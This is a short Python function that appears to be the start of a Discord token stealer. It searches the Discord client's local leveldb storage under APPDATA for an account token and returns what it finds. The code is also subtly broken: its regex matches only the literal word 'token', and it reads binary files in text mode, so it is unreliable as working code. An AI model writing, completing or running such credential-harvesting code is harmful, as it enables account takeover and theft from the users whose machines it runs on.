import os
import re

def get_discord_token():
    discord_path = os.path.join(os.environ["APPDATA"], "discord", "Local Storage", "leveldb")
    if not os.path.exists(discord_path):
        return None
    for file in os.listdir(discord_path):
        if not file.endswith(".ldb"):
            continue
        with open(os.path.join(discord_path, file), "r") as f:
            raw_text = f.read()
            match = re.search(r"token", raw_text)
            if match:
                return match.group(0)
    return None
